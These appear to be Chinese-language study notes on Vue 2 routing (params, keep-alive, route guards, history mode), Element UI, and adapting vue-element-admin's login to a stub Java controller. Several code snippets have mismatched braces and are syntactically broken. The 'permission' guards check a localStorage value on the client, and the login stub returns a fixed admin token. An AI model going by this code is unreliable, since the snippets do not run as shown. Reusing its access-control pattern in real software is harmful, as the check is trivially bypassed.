//创建并暴露一个路由器
export default new VueRouter({
    //注意：此处的是routes,不是routers
    routes: [  //一级路由
        ...
        {
            path: 'message', //路径
            component: Message, //组件名
            children: [
                {
                    name: 'xiangqing',//命名路由-1定义命名路由
                    path: 'detail/:id/:title', //路由参数_params参数-定义params参数
                    component: Detail,
                    /* props方法3-函数写法2_ES6解构赋值 */
                    props({params}) {
                        return {
                            id: params.id,
                            title: params.title
                        }
                    }

                    /* props方法3-函数写法2_ES6连续解构赋值 */
                    /*    props({params:{id,title}}) {
                                return {
                                    id,title
                                }
                            } */
                }
            ]
        }]
}
      ]
         })
```



##### Detail组件：

```vue
<template>
<ul>
    <li>a:{{id}}</li>
    <li>b:{{title}}</li>
</ul>
</template>

<script>
export default {
  name: "Detail",
  props:['id',"title"], //接收路由参数：props方法2-布尔值写法
  mounted() {
    console.log('@@@',this.$route)
  },
};
</script>
```

## push和replace模式: 
push和replace模式: 
​         ①push（追加历史路径记录，默认）
​         ②replace（替换当前路径记录）

App组件：

```vue
<router-link 
   class="list-group-item" 
   replace
   active-class="active" 
   :to="{name:'guanyu'}">
      About
</router-link>
```

## keep-alive标签(缓存路由组件)：

meta:路由原信息

shiro是后端权限框架

作用：让不展示的路由组件保持挂载，不被销毁。（切换组件输入框不清空)

​        include:根据组件名,指定缓存组件（默认缓存所有子组件。）

​         单个缓存-字符串方式

​         多个缓存-数组方式

```vue
      <ul>
        <!--  keep-alive标签(缓存路由组件)：
                include:根据组件名,指定缓存组件（默认缓存所有子组件。）
                  单个缓存-字符串方式
                  多个缓存-数组方式
         -->
        <keep-alive include="News"> <!-- 单个缓存-字符串方式  -->
<!--    <keep-alive :include="['News','Message']"> --> <!-- 多个缓存-数组方式   -->
          <!-- 指定组件的呈现位置 -->
          <router-view></router-view>
        </keep-alive>
      </ul>
```

XXX组件：

```vue
<template> <!-- News组件 -->
            <h2>我是News的内容</h2>
</template>

<template><!-- Message组件 -->
            <h2>我是Message的内容</h2>
</template>
```



## 路由生命周期：

作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。

1. ```activated```路由组件被激活时触发。
2. ```deactivated```路由组件失活时（取消激活）触发。



## 编程式路由导航：

```vue
<template>
<div class="col-xs-offset-2 col-xs-8">
    <div class="page-header"></div>
    <h1>注意:此案例依赖bootstrap框架</h1>
    <button @click="forwardTest">前进</button>
    <button @click="backTest">后退</button>
    <button @click="goTest">go</button>
    </div>
</template>

<script>
    export default {
        name: "Banner",
        methods: {
            backTest() {
                this.$router.back(); //后退
            },
            forwardTest() {
                this.$router.forward(); //前进
            },
            goTest() {
                this.$router.go(3); //根据参数前进 或后退
            },
            pushShow(m) { //push方式
                this.$router.push({
                    name: "xiangqing",
                    params: {
                        id: m.id,
                        title: m.title,
                    },
                });
            },
            replaceShow(m) {// replace方式2
                this.$router.replace({
                    name: "xiangqing",
                    params: {
                        id: m.id,
                        title: m.title,
                    },
                });
            },
        },
    };
</script>
```

## 路由守卫(权限)：

​    作用：对路由进行权限控制(权限分离)。

### 全局守卫：



router/index.js文件

```js
//创建路由器
const router = new VueRouter({ 
   {
     name: 'xiaoxi',
     path: 'message',
     component: Message,
     meta: { isAuth: true, //true：设置权限（默认为false）
             title: '消息' },
children: [
   {
     name: 'xiangqing',//命名路由-1定义命名路由
     path: 'detail/:id/:title', //路由参数_params参数-定义params参数
     component: Detail,
     meta: { isAuth: true, title: '详情' },//true：为设置权限
     }
         ]
  }                                           
                          )}
                             
                          
// 全局前置路由守卫(权限)-初始化时执行、每次路由切换前执行
router.beforeEach((to, from, next) => { //要去那，哪里来
    console.log(to, from)
        //if (to.name === 'xinwen' || to.name === 'xiaoxi') { //获取路径-方法1
        // if (to.path === '/home/mews' || to.path === '/home/message') { //获取路径-方法2
       if (to.meta.isAuth) { //判断是否需要拦截-方法3
          if(localStorage.getItem('school')==='atguigu2'){
            alert('权限放行');
            next(); //权限放行
          }else {
            alert('学校名不对，无权限查看')
        }
        } else {
            next(); //权限放行
        }
}
//全局后置守卫：初始化时执行、每次路由切换后执行
router.afterEach((to,from)=>{
	console.log('afterEach',to,from)
	if(to.meta.title){ 
		document.title = to.meta.title //修改网页的title
	}else{
		document.title = 'vue_test'
	}
})

// 暴露一个路由器-默认暴露
export default router;
```



### 独享守卫：

   注意：独享路由守卫只有前置，但可配合全局后置守卫使用。

router/index.js文件：

```js
//创建路由器
const router = new VueRouter({
    //注意：此处的是routes,不是routers
  routes: [  //一级路由
    {
      name: 'zhuye',
      path: '/home',
      component: Home,
      meta: { title: '主页' },
      children: [ //二级路由/子路由   
         {  //注意：子路由默认带的路径“/”。
           name: 'xinwen',
           path: 'mews',
           component: News,
           meta: {
              isAuth: true,  //true：设置权限（默认为false）
               title: '新闻'},
          beforeEnter: (to, from, next) => { //独享路由守卫
              if (to.meta.isAuth) { //判断是否需要拦截
                if (localStorage.getItem('school') === 'atguigu') {
                     next(); //权限放行
                 } else {
                     alert('学校名不对，无权限查看')
              }
                } else {
                            next(); //权限放行
                        }
                    }
                }, {
                    name: 'xiaoxi',
                    path: 'message',
                    component: Message,
                    meta: {
                        isAuth: true, //true：为设置权限（默认为false）
                        title: '消息'
                    },
                    children: [
                        {
                            name: 'xiangqing',//命名路由-1定义命名路由
                            path: 'detail/:id/:title', //路由参数_params参数-定义params参数
                            component: Detail,
                            meta: { isAuth: true, title: '详情' },//true：为设置权限（默认为false）
                        }
                    ]
                }
          }
            ]
        })
```



### 组件内守卫：

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  //组件内守卫-进入守卫  ：通过路由规则（按钮点击），进入组件时调用（注意：引入组件不行）
  beforeRouteEnter(to, from, next) {
    console.log("App--->beforeRouteEnter", to, from);
    if (to.meta.isAuth) {//判断是否需要拦截
      if (localStorage.getItem("school") === "atguigu") {
        next(); //权限放行
      } else {
        alert("学校名不对，无权限查看");
      }
    } else {
      next(); //权限放行
    }
  },
    
  //组件内守卫-离开守卫   ：通过路由规则，离开组件时调用
  beforeRouteLeave (to, from, next) {
    console.log("App--->beforeRouteLeave", to, from);
    next(); //权限放行
  }
};
</script>
```



## 路由器的两种工作模式：

   1.对应一个url来说，什么是hash值？ ——#及其后面的内容就是hash值。
​   2.hash值不会包含在HTTP请求中，既：hash值不会带给服务器。
​   3.hash模式： /#
​      ①地址中永远带着#号，不美观。
​      ②若以后将地址通过第三方手机app分享，若app检验严格，则地址会被标记为不合法。
​     ③兼容性较好。

 4.history模式：
​     ①地址干净，  美观。
​     ②兼容性和hash模式相比差。
​     ③应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。

### 路由器的两种工作模式：

 router/index.js文件：

```js
//创建路由器
const router = new VueRouter({
 /* 路由的工作模式: 
     ①hash（默认）: 请求路径带#号  例：http://localhost:8080/#/home
     ②history：请求路径不带#号  例：http://localhost:8080/home
         注意：history路径不能刷新，服务器必须使用history插件才行。
     Vue项目打包：npm run build    */
    mode:'history',
    routes: [{ ... }] //一级路由
})

// 暴露一个路由器-默认暴露
export default router;
```



### 解决history路径不能刷新问题：

​     使用node-express服务器框架解决项目的history路径不能刷新问题。
​     静态页面放static或publus文件夹。

#### 安装connect-history：

```js
npm i connect-history-api-fallback //安装connect-history
```



#### 在服务器使用connect-history：

```js
//注意：此处不能使用ES6的模块化,只能用Common.js的模块化。
const express=require('express')
//引入history插件
// const history=require('connect-history-api-fallback')

const app=express()

//  使用插件
// app.use(history()) //注意：必须在express的前面
app.use(express.static(__dirname+'/static')); //引入静态资料

// get请求
app.get('/person',(req,res)=>{
    res.send({
        name:'tom',
        age:18
    })
})

//开启端口监听
app.listen(5005,(err)=>{ //端口号
    if(!err) console.log('服务器启动了！')
})
```



# Vue UI组件库：

SPA(单页web应用程序)应用

webpack默认支持Tree shaking。

## Element UI:

### 使用：

#### 完整引入：

main.js文件：

```js
...
// 引入ElementUI-完整引入
import ElementUI from 'element-ui'
// 引入ElementUI的全部样式
import 'element-ui/lib/theme-chalk/index.css';

// 使用ElementUI插件
Vue.use(ElementUI);

// 创建Vue实例对象 --vm
new Vue({//将App组件放入容器中
    render: h => h(App),
}).$mount("#app")
```



#### 按需引入：

main.js文件：

```js
...
// 引入ElementUI-按需引入
import {Row,Button,DatePicker} from 'element-ui'

//使用组件
Vue.component(Button.name,Button)
Vue.component(Row.name,Row)
Vue.component(DatePicker.name,DatePicker)

// 创建Vue实例对象 --vm
new Vue({
    //将App组件放入容器中
    render: h => h(App),
}).$mount("#app")
```

App组件：

```vue
<template>
<div>
    <div>
        <button>原生的button</button>
        <input type="text" />
    </div>

    <div>
        <el-row>
            <el-button>默认按钮</el-button>
            <el-button type="primary">主要按钮</el-button>
            <el-button type="success">成功按钮</el-button>
            <el-button type="info">信息按钮</el-button>
            <el-button type="warning">警告按钮</el-button>
            <el-button type="danger">危险按钮</el-button>
    </el-row>

        <el-date-picker type="date" placeholder="选择日期"> </el-date-picker>
        <el-row>
            <el-button icon="el-icon-search" circle></el-button>
            <el-button type="primary" icon="el-icon-edit" circle></el-button>
            <el-button type="success" icon="el-icon-check" circle></el-button>
            <el-button type="info" icon="el-icon-message" circle></el-button>
            <el-button type="warning" icon="el-icon-star-off" circle></el-button>
            <el-button type="danger" icon="el-icon-delete" circle></el-button>
    </el-row>
    </div>
    </div>
</template>

<script scope>
    //默认暴露
    export default {
        name: "App",
    };
</script>
```





# Vue框架模板：

## vue-element-admin：

​    vue-element-admin是基于Vue和Element-ui 的一套后台管理系统集成方案。

功能：https://panjiachen.github.io/vue-element-admin-site/zh/guide/#功能
GitHub地址：https://github.com/PanJiaChen/vue-element-admin
项目在线预览[https://panjiachen.gitee.io/vue-element-admin]

​    注意：此框架调用ajax请求默认实现失败返回值。

### 目录结构

```js
|-dist 生产环境打包生成的打包项目
|-mock 产生模拟数据
|-public 包含会被自动打包到项目根路径的文件夹
	|-index.html 唯一的页面
|-src
	|-api 包含接口请求函数模块   ==》
		|-table.js  表格列表mock数据接口的请求函数
		|-user.js  用户登陆相关mock数据接口的请求函数
	|-assets 组件中需要使用的公用资源
		|-404_images 404页面的图片
	|-components 非路由组件
		|-SvgIcon svg图标组件
		|-Breadcrumb 面包屑组件(头部水平方向的层级组件)
		|-Hamburger 用来点击切换左侧菜单导航的图标组件
	|-icons
		|-svg 包含一些svg图片文件
		|-index.js 全局注册SvgIcon组件,加载所有svg图片并暴露所有svg文件名的数组
	|-layout
		|-components 组成整体布局的一些子组件
		|-mixin 组件中可复用的代码
		|-index.vue 后台管理的整体界面布局组件
	|-router
		|-index.js 路由器
	|-store
		|-modules
			|-app.js 管理应用相关数据
			|-settings.js 管理设置相关数据
			|-user.js 管理后台登陆用户相关数据
		|-getters.js 提供子模块相关数据的getters计算属性
		|-index.js vuex的store
	|-styles
		|-xxx.scss 项目组件需要使用的一些样式(使用scss)
	|-utils 一些工具函数
		|-auth.js 操作登陆用户的token cookie
		|-get-page-title.js 得到要显示的网页title
		|-request.js axios二次封装的模块
		|-validate.js 检验相关工具函数
		|-index.js 日期和请求参数处理相关工具函数
	|-views 路由组件文件夹
		|-dashboard 首页
		|-login 登陆
	|-App.vue 应用根组件
	|-main.js 入口js
	|-permission.js 使用全局守卫实现路由权限控制的模块
	|-settings.js 包含应用设置信息的模块
|-.env.development 指定了开发环境的代理服务器前缀路径
|-.env.production 指定了生产环境的代理服务器前缀路径
|-.eslintignore eslint的忽略配置
|-.eslintrc.js eslint的检查配置
|-.gitignore git的忽略配置
|-.npmrc 指定npm的淘宝镜像和sass的下载地址
|-babel.config.js babel的配置
|-jsconfig.json 用于vscode引入路径提示的配置
|-package.json 当前项目包信息
|-package-lock.json 当前项目依赖的第三方包的精确信息
|-vue.config.js webpack相关配置(如: 代理服务器)
```

## 改造登录&退出：

### 登录：

vue.config.js：

- 注释掉mock接口配置
- 配置代理转发请求到目标接口

```json
// before: require('./mock/mock-server.js')
proxy: {
  '/dev-api': { // 匹配所有以 '/dev-api'开头的请求路径
    target: 'http://localhost:8800', //后端端口
    changeOrigin: true, // 支持跨域
    pathRewrite: { // 重写路径: 去掉路径中开头的'/dev-api'
      '^/dev-api': ''
    }
  }
}
```

src/utils/request.js：

```js
if (res.code !== 200) { // 状态改为200
  Message({ 
    message: res.message || 'Error',
    type: 'error',
    duration: 5 * 1000
  })
  return Promise.reject(new Error(res.message || 'Error'))
} else {
  return res
}
```

修改登录路径：

​      路径 ==>  src/api/user.js:

```js
import request from '@/utils/request'

export function login(data) { // 登录
  return request({
    url: '/admin/system/index/login',//修改后端Controller路径
    method: 'post',
    data
  })
}

export function getInfo(token) { // 获取用户信息
  return request({
    url: '/admin/system/index/info',//修改后端Controller路径
    method: 'get',
    params: { token }
  })
}

export function logout() { // 退出
  return request({
    url: '/admin/system/index/logout',
    method: 'post'
  })
}
```



后端Controller:

```java
/**
  后台登录/退出
 */
@Api(tags = "登录&退出")
@RestController
@RequestMapping("/admin/system/index")
public class IndexController {


    /* 登录*/
    @PostMapping("/login")
    public Result login() {
        Map<String, Object> map = new HashMap<>();
        map.put("token","admin");
        return Result.ok(map);
    }
    
    /* 获取用户信息*/
    @GetMapping("/info")
    public Result info() {
        Map<String, Object> map = new HashMap<>();
        map.put("roles","[admin]");
        map.put("name","admin");
        map.put("avatar","https://wpimg.wallstcn.com/f778738c-e4f8-4870-b634-56703b4acafe.gif");
        return Result.ok(map);
    }
    
    /* 退出 */
    @PostMapping("/logout")
    public Result logout(){
        return Result.ok();
    }
}
```





### 退出：